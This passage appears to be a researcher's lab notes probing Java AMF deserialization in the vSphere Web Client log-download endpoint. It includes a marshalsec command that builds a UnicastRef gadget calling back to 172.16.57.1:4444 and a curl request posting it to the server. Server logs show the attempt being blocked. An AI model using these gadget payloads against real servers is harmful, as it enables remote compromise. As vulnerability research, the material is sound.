Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">\r\n<!-- saved from url=(0014)about:internet -->\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\" lang=\"en\" xml:lang=\"en\">\r\n   <head>\r\n      <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />\r\n      <style type=\"text/css\" media=\"screen\">\r\n         html {\r\n            background: #3075ab; /* Old browsers */\r\n            background: -moz-linear-gradient(top,  #3a8dc8 0%, #183a62 100%); /* FF3.6+ */\r\n            background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,#3a8dc8), color-stop(100%,#183a62)); /* Chrome,Safari4+ */\r\n            background: -webkit-linear-gradient(top,  #3a8dc8 0%,#183a62 100%); /* Chrome10+,Safari5.1+ */\r\n            background: -o-linear-gradient(top,  #3a8dc8 0%,#183a62 100%); /* Opera 11.10+ */\r\n            background: -ms-linear-gradient(top,  #3a8dc8 0%,#183a62 100%); /* IE10+ */\r\n            background: linear-gradient(to bottom,  #3a8dc8 0%,#183a62 100%); /* W3C */\r\n            filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#3a8dc8', endColorstr='#183a62',GradientType=0 ); /* IE6-9 */\r\n            background-repeat: no-repeat;\r\n\r\n            height: 100%;\r\n            overflow: auto;\r\n            margin: 0;\r\n            padding: 0;\r\n         }\r\n\r\n         #errorAreaWrapper {\r\n            position: relative;\r\n            float: left;\r\n            left: 50%;\r\n            margin-top: 30px;\r\n         }\r\n\r\n         #errorArea {\r\n            position: relative;\r\n            float: left;\r\n            left: -50%;\r\n            padding: 15px;\r\n            background-color: white;\r\n            font-size: 14px;\r\n            color: #000000;\r\n            font-family: Georgia, Arial, Helvetica, sans-serif;\r\n            border: 1px solid black;\r\n         }\r\n\r\n         #errorImage {\r\n            border: 0;\r\n            margin-right: 10px;\r\n            display: inline-block;\r\n            vertical-align: top;\r\n         }\r\n\r\n         #errorAllText {\r\n            display: inline-block;\r\n            vertical-align: top;\r\n            min-width: 500px;\r\n            max-width: 700px;\r\n         }\r\n\r\n         #errorSorry {\r\n            font-weight: bold;\r\n         }\r\n\r\n         #errorMessage {\r\n            padding-top: 10px;\r\n            padding-bottom: 10px;\r\n         }\r\n\r\n         #errorCheckLog {\r\n            font-style: italic;\r\n         }\r\n      </style>\r\n   </head>\r\n   <body>\r\n      <div id=\"errorAreaWrapper\">\r\n        <div id=\"errorArea\">\r\n          <div id=\"errorImage\"><img src=\"/vsphere-client/assets/warning48x.png\" alt=\"Error\" /></div>\r\n          <div id=\"errorAllText\">\r\n             <div id=\"errorSorry\">A server error occurred.</div>\r\n             <div id=\"errorMessage\">Unknown AMF type '65'.</div>\r\n             <div id=\"errorCheckLog\">Check the vSphere Web Client server logs for details.</div>\r\n          </div>\r\n        </div>\r\n      </div>\r\n   </body>\r\n</html>\r\n* Closing connection 0\r\n* TLSv1.2 (OUT), TLS alert, close notify (256):\r\nwvu@kharak:~$\r\n```\r\n\r\n```\r\n[2021-12-04T01:02:59.500Z] [WARN ] http-nio-9090-exec-7         70000069 ###### ###### com.vmware.vsphere.client.logbundle.DownloadLogController         ClientId is null.\r\n[2021-12-04T01:02:59.507Z] [ERROR] http-nio-9090-exec-7          o.a.c.c.C.[.[localhost].[/vsphere-client].[downloadManager]       Servlet.service() for servlet [downloadManager] in context with path [/vsphere-client] threw exception [Request processing failed; nested exception is flex.messaging.io.UnknownTypeException: Unknown AMF type '65'.] with root cause flex.messaging.io.UnknownTypeException: Unknown AMF type '65'.\r\n\tat flex.messaging.io.amf.Amf3Input.readObjectValue(Amf3Input.java:232)\r\n\tat flex.messaging.io.amf.Amf3Input.readObject(Amf3Input.java:134)\r\n\tat com.vmware.vsphere.client.logbundle.DownloadLogController.parseSelectedLogsSpec(DownloadLogController.java:745)\r\n\tat com.vmware.vsphere.client.logbundle.DownloadLogController.processSelectedLogsSpecParameter(DownloadLogController.java:584)\r\n\tat com.vmware.vsphere.client.logbundle.DownloadLogController.downloadLogBundles(DownloadLogController.java:201)\r\n\tat sun.reflect.GeneratedMethodAccessor196.invoke(Unknown Source)\r\n\tat sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\r\n\tat java.lang.reflect.Method.invoke(Method.java:498)\r\n\tat org.springframework.web.bind.annotation.support.HandlerMethodInvoker.invokeHandlerMethod(HandlerMethodInvoker.java:181)\r\n\tat org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter.invokeHandlerMethod(AnnotationMethodHandlerAdapter.java:440)\r\n\tat org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter.handle(AnnotationMethodHandlerAdapter.java:428)\r\n\tat org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:967)\r\n\tat org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:901)\r\n\tat org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:970)\r\n\tat org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:872)\r\n\tat javax.servlet.http.HttpServlet.service(HttpServlet.java:661)\r\n\tat org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:846)\r\n\tat javax.servlet.http.HttpServlet.service(HttpServlet.java:742)\r\n\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231)\r\n\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)\r\n\tat org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)\r\n\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)\r\n\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)\r\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:317)\r\n\tat org.springframework.security.web.access.intercept.FilterSecurityInterceptor.invoke(FilterSecurityInterceptor.java:127)\r\n\tat org.springframework.security.web.access.intercept.FilterSecurityInterceptor.doFilter(FilterSecurityInterceptor.java:91)\r\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331)\r\n\tat org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:114)\r\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331)\r\n\tat org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:137)\r\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331)\r\n\tat org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:111)\r\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331)\r\n\tat org.springframework.security.web.authentication.rememberme.RememberMeAuthenticationFilter.doFilter(RememberMeAuthenticationFilter.java:150)\r\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331)\r\n\tat org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:170)\r\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331)\r\n\tat org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:63)\r\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331)\r\n\tat org.springframework.security.web.authentication.AbstractAuthenticationProcessingFilter.doFilter(AbstractAuthenticationProcessingFilter.java:200)\r\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331)\r\n\tat org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:116)\r\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331)\r\n\tat org.springframework.security.web.header.HeaderWriterFilter.doFilterInternal(HeaderWriterFilter.java:66)\r\n\tat org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107)\r\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331)\r\n\tat org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter.doFilterInternal(WebAsyncManagerIntegrationFilter.java:56)\r\n\tat org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107)\r\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331)\r\n\tat org.springframework.security.web.context.SecurityContextPersistenceFilter.doFilter(SecurityContextPersistenceFilter.java:105)\r\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331)\r\n\tat com.vmware.vise.security.websso.SecurityRequestWrapperFilter.doFilterInternal(SecurityRequestWrapperFilter.java:47)\r\n\tat org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107)\r\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331)\r\n\tat org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:214)\r\n\tat org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:177)\r\n\tat org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:347)\r\n\tat org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:263)\r\n\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)\r\n\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)\r\n\tat com.vmware.vise.security.SessionManagementFilter.doFilter(SessionManagementFilter.java:177)\r\n\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)\r\n\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)\r\n\tat com.vmware.vsphere.client.logging.MDCLogFilter.doFilterInternal(MDCLogFilter.java:41)\r\n\tat org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107)\r\n\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)\r\n\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)\r\n\tat com.vmware.vise.extensionfw.DeploymentFilter.doFilter(DeploymentFilter.java:55)\r\n\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)\r\n\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)\r\n\tat com.vmware.vise.util.jsp.JspFilter.doFilterInternal(JspFilter.java:91)\r\n\tat org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107)\r\n\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)\r\n\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)\r\n\tat com.vmware.vise.security.SameSiteCookieHeaderFilter.doFilter(SameSiteCookieHeaderFilter.java:73)\r\n\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)\r\n\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)\r\n\tat org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:199)\r\n\tat org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:97)\r\n\tat org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:544)\r\n\tat org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:143)\r\n\tat org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:81)\r\n\tat org.apache.catalina.valves.RemoteIpValve.invoke(RemoteIpValve.java:764)\r\n\tat org.eclipse.virgo.web.tomcat.support.ApplicationNameTrackingValve.invoke(ApplicationNameTrackingValve.java:33)\r\n\tat org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:690)\r\n\tat org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:78)\r\n\tat org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343)\r\n\tat org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:616)\r\n\tat org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)\r\n\tat org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:831)\r\n\tat org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1634)\r\n\tat org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)\r\n\tat java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)\r\n\tat java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)\r\n\tat org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)\r\n\tat java.lang.Thread.run(Thread.java:748)\r\n```\r\n\r\n## Testing AMF deserialization using the `UnicastRef` gadget\r\n\r\n```\r\nroot@895ea1dbdd95:~/marshalsec# java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.BlazeDSAMF3 UnicastRef 172.16.57.1 4444 | base64 -w 0 | xargs\r\n\r\nCgczc3VuLnJtaS5zZXJ2ZXIuVW5pY2FzdFJlZgALMTcyLjE2LjU3LjEAABFcAAAAAHyVTXIAAAAAAAAAAAAAAAAAAAA=\r\nroot@895ea1dbdd95:~/marshalsec#\r\n```\r\n\r\n```\r\nwvu@kharak:~$ curl -kv https://172.16.57.237/vsphere-client/download/logs -d \"webClientSessionId=nope&SelectedLogsSpec=Cgczc3VuLnJtaS5zZXJ2ZXIuVW5pY2FzdFJlZgALMTcyLjE2LjU3LjEAABFcAAAAAHyVTXIAAAAAAAAAAAAAAAAAAAA=\"\r\n*   Trying 172.16.57.237:443...\r\n* Connected to 172.16.57.237 (172.16.57.237) port 443 (#0)\r\n* ALPN, offering h2\r\n* ALPN, offering http/1.1\r\n* TLSv1.3 (OUT), TLS handshake, Client hello (1):\r\n* TLSv1.3 (IN), TLS handshake, Server hello (2):\r\n* TLSv1.2 (IN), TLS handshake, Certificate (11):\r\n* TLSv1.2 (IN), TLS handshake, Server key exchange (12):\r\n* TLSv1.2 (IN), TLS handshake, Server finished (14):\r\n* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):\r\n* TLSv1.2 (OUT), TLS change cipher, Change cipher spec (1):\r\n* TLSv1.2 (OUT), TLS handshake, Finished (20):\r\n* TLSv1.2 (IN), TLS handshake, Finished (20):\r\n* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384\r\n* ALPN, server did not agree to a protocol\r\n* Server certificate:\r\n*  subject: CN=172.16.57.237; C=US\r\n*  start date: Nov 30 23:59:14 2021 GMT\r\n*  expire date: Dec  1 11:59:14 2023 GMT\r\n*  issuer: CN=CA; DC=vsphere; DC=local; C=US; ST=California; O=photon-machine; OU=VMware Engineering\r\n*  SSL certificate verify result: unable to get local issuer certificate (20), continuing anyway.\r\n> POST /vsphere-client/download/logs HTTP/1.1\r\n> Host: 172.16.57.237\r\n> User-Agent: curl/7.80.0\r\n> Accept: */*\r\n> Content-Length: 133\r\n> Content-Type: application/x-www-form-urlencoded\r\n>\r\n* Mark bundle as not supporting multiuse\r\n< HTTP/1.1 500\r\n< Set-Cookie: JSESSIONID=FCDFEC1FA6DBC64A0638002A142EB766; Path=/vsphere-client; Secure; HttpOnly\r\n< Cache-Control: no-cache, no-store, max-age=0, must-revalidate\r\n< Pragma: no-cache\r\n< Expires: 0\r\n< Strict-Transport-Security: max-age=31536000 ; includeSubDomains\r\n< X-XSS-Protection: 1; mode=block\r\n< X-Frame-Options: SAMEORIGIN\r\n< X-Content-Type-Options: nosniff\r\n< Content-Type: text/html;charset=utf-8\r\n< Content-Length: 2963\r\n< Date: Sat, 04 Dec 2021 01:04:57 GMT\r\n< Connection: close\r\n< Server: Anonymous\r\n<\r\n\r\n\r\n\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">\r\n<!-- saved from url=(0014)about:internet -->\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\" lang=\"en\" xml:lang=\"en\">\r\n   <head>\r\n      <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />\r\n      <style type=\"text/css\" media=\"screen\">\r\n         html {\r\n            background: #3075ab; /* Old browsers */\r\n            background: -moz-linear-gradient(top,  #3a8dc8 0%, #183a62 100%); /* FF3.6+ */\r\n            background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,#3a8dc8), color-stop(100%,#183a62)); /* Chrome,Safari4+ */\r\n            background: -webkit-linear-gradient(top,  #3a8dc8 0%,#183a62 100%); /* Chrome10+,Safari5.1+ */\r\n            background: -o-linear-gradient(top,  #3a8dc8 0%,#183a62 100%); /* Opera 11.10+ */\r\n            background: -ms-linear-gradient(top,  #3a8dc8 0%,#183a62 100%); /* IE10+ */\r\n            background: linear-gradient(to bottom,  #3a8dc8 0%,#183a62 100%); /* W3C */\r\n            filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#3a8dc8', endColorstr='#183a62',GradientType=0 ); /* IE6-9 */\r\n            background-repeat: no-repeat;\r\n\r\n            height: 100%;\r\n            overflow: auto;\r\n            margin: 0;\r\n            padding: 0;\r\n         }\r\n\r\n         #errorAreaWrapper {\r\n            position: relative;\r\n            float: left;\r\n            left: 50%;\r\n            margin-top: 30px;\r\n         }\r\n\r\n         #errorArea {\r\n            position: relative;\r\n            float: left;\r\n            left: -50%;\r\n            padding: 15px;\r\n            background-color: white;\r\n            font-size: 14px;\r\n            color: #000000;\r\n            font-family: Georgia, Arial, Helvetica, sans-serif;\r\n            border: 1px solid black;\r\n         }\r\n\r\n         #errorImage {\r\n            border: 0;\r\n            margin-right: 10px;\r\n            display: inline-block;\r\n            vertical-align: top;\r\n         }\r\n\r\n         #errorAllText {\r\n            display: inline-block;\r\n            vertical-align: top;\r\n            min-width: 500px;\r\n            max-width: 700px;\r\n         }\r\n\r\n         #errorSorry {\r\n            font-weight: bold;\r\n         }\r\n\r\n         #errorMessage {\r\n            padding-top: 10px;\r\n            padding-bottom: 10px;\r\n         }\r\n\r\n         #errorCheckLog {\r\n            font-style: italic;\r\n         }\r\n      </style>\r\n   </head>\r\n   <body>\r\n      <div id=\"errorAreaWrapper\">\r\n        <div id=\"errorArea\">\r\n          <div id=\"errorImage\"><img src=\"/vsphere-client/assets/warning48x.png\" alt=\"Error\" /></div>\r\n          <div id=\"errorAllText\">\r\n             <div id=\"errorSorry\">A server error occurred.</div>\r\n             <div id=\"errorMessage\">Creation validation for class 'sun.rmi.server.UnicastRef' failed.</div>\r\n             <div id=\"errorCheckLog\">Check the vSphere Web Client server logs for details.</div>\r\n          </div>\r\n        </div>\r\n      </div>\r\n   </body>\r\n</html>\r\n* Closing connection 0\r\n* TLSv1.2 (OUT), TLS alert, close notify (256):\r\nwvu@kharak:~$\r\n```\r\n\r\n```\r\n[2021-12-04T01:04:48.349Z] [WARN ] http-nio-9090-exec-1         70000071 ###### ###### com.vmware.vsphere.client.logbundle.DownloadLogController         ClientId is null.\r\n[2021-12-04T01:04:48.353Z] [WARN ] http-nio-9090-exec-1         70000071 ###### ###### c.vmware.vise.messaging.validators.ClassDeserializationValidator  Deserialization skipped for type sun.rmi.server.UnicastRef\r\n[2021-12-04T01:04:57.329Z] [ERROR] http-nio-9090-exec-1          o.a.c.c.C.[.[localhost].[/vsphere-client].[downloadManager]       Servlet.service() for servlet [downloadManager] in context with path [/vsphere-client] threw exception [Request processing failed; nested exception is flex.messaging.io.SerializationException: Creation validation for class 'sun.rmi.server.UnicastRef' failed.] with root cause flex.messaging.io.SerializationException: Creation validation for class 'sun.rmi.server.UnicastRef' failed.\r\n\tat flex.messaging.util.ClassUtil.validateCreation(ClassUtil.java:354)\r\n\tat flex.messaging.util.ClassUtil.createDefaultInstance(ClassUtil.java:115)\r\n\tat flex.messaging.io.AbstractProxy.createInstanceFromClassName(AbstractProxy.java:95)\r\n\tat flex.messaging.io.AbstractProxy.createInstance(AbstractProxy.java:115)\r\n\tat flex.messaging.io.amf.AbstractAmfInput.createObjectInstance(AbstractAmfInput.java:169)\r\n\tat flex.messaging.io.amf.Amf3Input.readScriptObject(Amf3Input.java:748)\r\n\tat flex.messaging.io.amf.Amf3Input.readObjectValue(Amf3Input.java:156)\r\n\tat flex.messaging.io.amf.Amf3Input.readObject(Amf3Input.java:134)\r\n\tat com.vmware.vsphere.client.logbundle.DownloadLogController.parseSelectedLogsSpec(DownloadLogController.java:745)\r\n\tat com.vmware.vsphere.client.logbundle.DownloadLogController.processSelectedLogsSpecParameter(DownloadLogController.java:584)\r\n\tat com.vmware.vsphere.client.logbundle.DownloadLogController.downloadLogBundles(DownloadLogController.java:201)\r\n\tat sun.reflect.GeneratedMethodAccessor196.invoke(Unknown Source)\r\n\tat sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\r\n\tat java.lang.reflect.Method.invoke(Method.java:498)\r\n\tat org.springframework.web.bind.annotation.support.HandlerMethodInvoker.invokeHandlerMethod(HandlerMethodInvoker.java:181)\r\n\tat org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter.invokeHandlerMethod(AnnotationMethodHandlerAdapter.java:440)\r\n\tat org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter.handle(AnnotationMethodHandlerAdapter.java:428)\r\n\tat org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:967)\r\n\tat org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:901)\r\n\tat org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:970)\r\n\tat org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:872)\r\n\tat javax.servlet.http.HttpServlet.service(HttpServlet.java:661)\r\n\tat org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:846)\r\n\tat javax.servlet.http.HttpServlet.service(HttpServlet.java:742)\r\n\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231)\r\n\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)\r\n\tat org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)\r\n\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)\r\n\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)\r\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:317)\r\n\tat org.springframework.security.web.access.intercept.FilterSecurityInterceptor.invoke(FilterSecurityInterceptor.java:127)\r\n\tat org.springframework.security.web.access.intercept.FilterSecurityInterceptor.doFilter(FilterSecurityInterceptor.java:91)\r\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331)\r\n\tat org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:114)\r\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331)\r\n\tat org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:137)\r\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331)\r\n\tat org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:111)\r\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331)\r\n\tat org.springframework.security.web.authentication.rememberme.RememberMeAuthenticationFilter.doFilter(RememberMeAuthenticationFilter.java:150)\r\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331)\r\n\tat org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:170)\r\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331)\r\n\tat org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:63)\r\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331)\r\n\tat org.springframework.security.web.authentication.AbstractAuthenticationProcessingFilter.doFilter(AbstractAuthenticationProcessingFilter.java:200)\r\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331)\r\n\tat org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:116)\r\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331)\r\n\tat org.springframework.security.web.header.HeaderWriterFilter.doFilterInternal(HeaderWriterFilter.java:66)\r\n\tat org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107)\r\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331)\r\n\tat org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter.doFilterInternal(WebAsyncManagerIntegrationFilter.java:56)\r\n\tat org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107)\r\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331)\r\n\tat org.springframework.security.web.context.SecurityContextPersistenceFilter.doFilter(SecurityContextPersistenceFilter.java:105)\r\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331)\r\n\tat com.vmware.vise.security.websso.SecurityRequestWrapperFilter.doFilterInternal(SecurityRequestWrapperFilter.java:47)\r\n\tat org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107)\r\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331)\r\n\tat org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:214)\r\n\tat org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:177)\r\n\tat org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:347)\r\n\tat org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:263)\r\n\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)\r\n\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)\r\n\tat com.vmware.vise.security.SessionManagementFilter.doFilter(SessionManagementFilter.java:177)\r\n\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)\r\n\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)\r\n\tat com.vmware.vsphere.client.logging.MDCLogFilter.doFilterInternal(MDCLogFilter.java:41)\r\n\tat org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107)\r\n\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)\r\n\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)\r\n\tat com.vmware.vise.extensionfw.DeploymentFilter.doFilter(DeploymentFilter.java:55)\r\n\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)\r\n\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)\r\n\tat com.vmware.vise.util.jsp.JspFilter.doFilterInternal(JspFilter.java:91)\r\n\tat org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107)\r\n\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)\r\n\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)\r\n\tat com.vmware.vise.security.SameSiteCookieHeaderFilter.doFilter(SameSiteCookieHeaderFilter.java:73)\r\n\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)\r\n\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)\r\n\tat org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:199)\r\n\tat org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:97)\r\n\tat org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:544)\r\n\tat org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:143)\r\n\tat org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:81)\r\n\tat org.apache.catalina.valves.RemoteIpValve.invoke(RemoteIpValve.java:764)\r\n\tat org.eclipse.virgo.web.tomcat.support.ApplicationNameTrackingValve.invoke(ApplicationNameTrackingValve.java:33)\r\n\tat org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:690)\r\n\tat org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:78)\r\n\tat org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343)\r\n\tat 